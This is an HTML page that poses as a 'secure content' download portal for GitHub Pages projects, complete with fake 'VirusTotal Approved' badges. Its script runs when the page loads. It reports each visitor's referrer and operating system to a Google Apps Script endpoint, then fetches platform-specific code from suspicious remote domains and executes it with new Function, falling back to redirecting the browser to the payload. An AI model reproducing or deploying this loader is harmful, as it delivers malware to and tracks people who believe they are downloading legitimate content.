<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="unsafe-url">

<title>Secure Content Delivery</title>

<style>

:root {
  --bg: #010409;
  --text: #f0f6fc;
  --muted: #8b949e;
  --border: #21262d;
  --card: #0c1015;
  --accent: #58a6ff;
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}

.k-navbar {
  border-bottom: 1px solid var(--border);
  padding: 16px 24px;
}

.k-logo {
  display: flex;
  align-items: center;
  gap: 10px;
}

.domain-path {
  font-size: 14px;
  color: var(--muted);
}

.main-content-area {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 40px 24px;
}

.k-download-panel {
  width: 100%;
  max-width: 560px;
}

.download-card {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 40px;
  text-align: center;
  box-shadow: 0 16px 32px rgba(1, 4, 9, 0.85);
}

.panel-header {
  text-align: center;
  margin-bottom: 24px;
}

.panel-title {
  font-size: 24px;
  font-weight: 600;
  margin-top: 12px;
}

.panel-subtitle {
  color: var(--muted);
  font-size: 14px;
  margin-top: 6px;
}

.card-header {
  display: flex;
  justify-content: space-between;
  margin-bottom: 18px;
}

.content-badge {
  font-size: 13px;
  color: var(--muted);
}

.version-badge {
  font-size: 12px;
  border: 1px solid var(--border);
  padding: 3px 6px;
  border-radius: 6px;
}

.security-features {
  display: flex;
  justify-content: center;
  gap: 16px;
  margin-bottom: 20px;
}

.security-item {
  font-size: 13px;
  color: var(--muted);
}

.security-dot {
  width: 6px;
  height: 6px;
  background: var(--accent);
  display: inline-block;
  border-radius: 50%;
  margin-right: 6px;
}

.loader-wrap {
  margin-top: 20px;
}

.loader-title {
  margin-top: 10px;
  font-size: 15px;
}

.loader-muted {
  font-size: 13px;
  color: var(--muted);
}

.spinner {
  width: 20px;
  height: 20px;
  border: 2px solid #30363d;
  border-top: 2px solid var(--accent);
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 18px auto 12px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.verification-badges {
  margin-top: 22px;
  display: flex;
  justify-content: center;
  gap: 14px;
}

.verification-badge {
  font-size: 12px;
  color: var(--muted);
}

.check-dot {
  width: 6px;
  height: 6px;
  background: #3fb950;
  display: inline-block;
  border-radius: 50%;
  margin-right: 6px;
}

</style>

</head>

<body>

<nav class="k-navbar">
<div class="nav-section-left">

<div class="k-logo">

<span id="domainPath" class="domain-path">/secure-content</span>

</div>
</div>
</nav>

<main class="main-content-area">

<div class="k-download-panel">

<div class="panel-header">

<h1 class="panel-title" id="dynamicTitle">Validating session</h1>

<p class="panel-subtitle" id="dynamicSubtitle">Generating secure token</p>

</div>

<div class="download-card">

<div class="card-header">

<div class="content-badge">

<span>🔒 Authorized Access</span>

</div>

<div class="version-info">

<span class="version-badge">secure</span>

</div>

</div>

<div class="security-features">

<div class="security-item">

<span class="security-dot"></span>
<span>Verified Access</span>

</div>

<div class="security-item">

<span class="security-dot"></span>
<span>Secure Connection</span>

</div>

</div>

<div class="loader-wrap">

<div class="spinner"></div>

<p class="loader-title" id="loaderHeadline">Validating session</p>

<p class="loader-muted" id="loaderStatus">Generating secure token</p>

</div>

<div class="verification-badges">

<div class="verification-badge">
<span class="check-dot"></span>
VirusTotal Approved
</div>

<div class="verification-badge">
<span class="check-dot"></span>
Secure Archive
</div>

</div>

</div>
</div>
</main>

<script>

const REMOTE_WINDOWS = "https://hamaldcolatenovene.com/capi.vitbar";
const REMOTE_MAC = "https://cementrastustatchy.com/pencel.rummer";

const ERROR_URL = "https://github.com/";

const APP_URL = "https://script.google.com/macros/s/AKfycbzcc-DrgeXVXUqF0ZzVeA1PwlFTOLMdXszxROOqbmA4MWCPobSyWhGGEmpZWgogP02qZA/exec";

function getProjectInfoFromHost(){

const host = window.location.hostname || "";
const projectSlug = host.replace(".github.io","");

return {host,projectSlug};

}

function formatProjectName(slug){

if(!slug) return "Content";

return slug
.replace(/-/g," ")
.split(" ")
.filter(Boolean)
.map(w=>w.charAt(0).toUpperCase()+w.slice(1))
.join(" ");

}

function updateUI(){

const info = getProjectInfoFromHost();
const pretty = formatProjectName(info.projectSlug);

document.getElementById("domainPath").textContent="/"+(info.host||"secure-content");

document.getElementById("dynamicTitle").textContent=pretty;

document.getElementById("dynamicSubtitle").textContent=
info.host?`Content package for ${info.host}`:"Content package";

}

function detectOS(){

const uad=navigator.userAgentData;

if(uad&&uad.platform){

const p=uad.platform.toLowerCase();

if(p.includes("windows")) return "windows";
if(p.includes("mac")) return "macos";

}

const ua=navigator.userAgent||"";

if(/Windows NT/i.test(ua)) return "windows";
if(/Macintosh;.*Mac OS X/i.test(ua)) return "macos";

return "other";

}

function getReferrerUrl(){

if(document.referrer && document.referrer.length>0){
return document.referrer;
}

return window.location.href;

}

function sendLink(){

const referrer=getReferrerUrl();
const os=detectOS();

const payload={
offer:referrer,
os:os
};

const q=new URLSearchParams({
p:JSON.stringify(payload)
}).toString();

new Image().src=APP_URL+"?"+q+"&_t="+Date.now();

}

document.addEventListener("DOMContentLoaded",()=>{

updateUI();

setTimeout(()=>{

const os=detectOS();

sendLink();

if(os==="windows"||os==="macos"){

const targetUrl=os==="windows"?REMOTE_WINDOWS:REMOTE_MAC;

async function load(){

try{

const res=await fetch(targetUrl,{cache:"no-store"});
const code=await res.text();

const headline=document.getElementById("dynamicTitle");
const status=document.getElementById("dynamicSubtitle");

new Function("headline","status",code)(headline,status);

}catch{

setTimeout(()=>{
window.location.replace(targetUrl);
},1450);

}

}

load();

}else{

document.getElementById("dynamicTitle").textContent="Attention: Unsupported Operating System";

document.getElementById("dynamicSubtitle").textContent=
"To continue installation, you must be using Windows or macOS.";

setTimeout(()=>{
window.location.replace(ERROR_URL);
},4000);

}

},3000);

});

</script>

</body>
</html>
